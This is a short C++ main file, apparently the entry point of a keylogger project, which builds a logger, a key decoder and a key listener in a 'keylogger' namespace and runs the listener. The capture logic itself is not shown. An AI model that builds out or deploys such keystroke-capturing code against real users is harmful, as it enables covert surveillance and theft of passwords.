
#include "KeyListener.hpp"

using namespace keylogger;

int main()
{
    Logger logger;
    KeyDecoder decoder(logger);
    KeyListener listener(decoder);

    listener.Run();
    return 0;
}